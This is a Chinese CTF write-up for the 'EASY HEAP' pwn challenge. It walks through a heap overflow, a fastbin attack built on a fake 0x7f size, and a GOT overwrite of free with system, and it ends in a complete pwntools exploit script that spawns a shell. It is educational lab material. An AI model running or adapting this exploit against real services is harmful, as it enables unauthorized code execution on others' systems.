---
title: "EASY HEAP"
date: 2026-11-13 19:08:04
categories:
  - "知识点"
  - "堆"
tags: ["fastbin"]
---

<!-- 本文件由 tools/sync_notes.py 生成，请勿手动编辑；改 notes/ 里的源笔记后重新同步 -->
<!-- sync-source: notes/external/typora-pwn/pwn题目.md#2 -->
![image-20261012153624854](/pwn-notes/images/notes/image-20261012153624854.png)

首先还是菜单题

![image-20261012160409368](/pwn-notes/images/notes/image-20261012160409368.png)

依旧是

creat a heap

![image-20261012160658801](/pwn-notes/images/notes/image-20261012160658801.png)

在这里并没有什么

之后

![image-20261012163657355](/pwn-notes/images/notes/image-20261012163657355.png)

atoi函数就是将输入的字符串转化成整数

![image-20261012164241496](/pwn-notes/images/notes/image-20261012164241496.png)

所以说这里就是进行堆溢出

delete函数，指针清零，不存在uaf

![image-20261012164440010](/pwn-notes/images/notes/image-20261012164440010.png)

![image-20261012172805483](/pwn-notes/images/notes/image-20261012172805483.png)



![image-20261012154050929](/pwn-notes/images/notes/image-20261012154050929.png)

后门函数

#### fastbin attack

fastbin检查：

也就是从fastbin取堆块的时候会检查其size字段，计算这个除以16再-2，看是否和这个档位相符。然后再取

![image-20261012171519666](/pwn-notes/images/notes/image-20261012171519666.png)

如果申请0x60大小的堆块，之后分配0x70，之后修改size段为0x7f,之后就绕过检查

![image-20261012172306617](/pwn-notes/images/notes/image-20261012172306617.png)

所以再填满chunk1之后再填满prev_size之后就到达size字段，和fd

![image-20261012173932094](/pwn-notes/images/notes/image-20261012173932094.png)

edit函数把一开始写入的内容修改掉了

![image-20261012175410623](/pwn-notes/images/notes/image-20261012175410623.png)

一开始创建的三个·0x60大小的堆块，

然后其fd存储的都是一开始存储的内容

接下来释放chunk2

![image-20261012180147339](/pwn-notes/images/notes/image-20261012180147339.png)

此时chunk2已经进入fastbin链表，

之后修改chunk1，并且把字符串写入进去，修改chunk2的fd字段，和size字段

![image-20261012181038960](/pwn-notes/images/notes/image-20261012181038960.png)

可以看到此时fastbin链表中已经有了我们想要的数组附近的地址

接下来申请fastbin链表中的堆块，

![image-20261012182207587](/pwn-notes/images/notes/image-20261012182207587.png)

因为一开始把chunk2的fd指针改成0x6020ad ,之后malloc的时候就会返回+0x10的

![image-20261012182620381](/pwn-notes/images/notes/image-20261012182620381.png)

![image-20261012183956176](/pwn-notes/images/notes/image-20261012183956176.png)

所以说我们一开始申请的就是ad这里的值，之后因为+0x8之后正好是size字段，之后正好size字段是0x7f，满足从fastbin里面取堆块的条件，所以之后的content段就在bd，而接下来我们只需要填充chunk3,到达后面的指针数组，之后修改

![image-20261012184519123](/pwn-notes/images/notes/image-20261012184519123.png)

修改chunk0的堆地址为free的got,之后

![image-20261012184740043](/pwn-notes/images/notes/image-20261012184740043.png)

![image-20261012185147277](/pwn-notes/images/notes/image-20261012185147277.png)

修改完成

![image-20261012185250528](/pwn-notes/images/notes/image-20261012185250528.png)

这是里面的原始值，接下来修改为system函数地址

![image-20261012185958526](/pwn-notes/images/notes/image-20261012185958526.png)

修改哦完之后

![image-20261012190329535](/pwn-notes/images/notes/image-20261012190329535.png)

修改完成，之后只需要删除chunk0就可以，触发system

![image-20261012190608410](/pwn-notes/images/notes/image-20261012190608410.png)

这里传入的是system函数的got,需要plt

![image-20261012190819669](/pwn-notes/images/notes/image-20261012190819669.png)

```python
from pwn import *
context.log_level="debug"
io=process("./pwn")
#io=remote("node4.buuoj.cn",26646)
elf=ELF("./pwn")
#gdb.attach(io)
def add(size,content):
    io.recvuntil("choice :")
    io.sendline("1")
    io.recvuntil("Size of Heap : ")
    io.sendline(str(size))
    io.recvuntil("Content of heap:")
    io.send(content)


def edit(index,size,content):
    io.recvuntil("choice :")
    io.sendline("2")
    io.recvuntil("Index :")
    io.sendline(str(index))
    io.recvuntil("Size of Heap : ")
    io.sendline(str(size))
    io.recvuntil("Content of heap : ")
    io.send(content)

def delete(index):
    io.recvuntil("choice :")
    io.sendline("3")
    io.recvuntil("Index :")
    io.sendline(str(index))

add(0x60,"happy")
add(0x60,"happy")
add(0x60,"happy")

delete(2)

pay1=b'/bin/sh\x00'+b'a'*0x60+p64(0x71)+p64(0x6020ad)
edit(1,len(pay1),pay1)

add(0x60,"aaaa")
add(0x60,"bbbb")
pay2=b'a'*0x23+p64(elf.got["free"])
edit(3,len(pay2),pay2)
pay3=p64(elf.plt["system"])
edit(0,len(pay3),pay3)
delete(1)
io.interactive()

```

<!-- sync-hash: 9d5155d6b0b0331cff430721f6e5d0deb8a8ad6d2e654c82ae92b40cc9e05bb3 -->
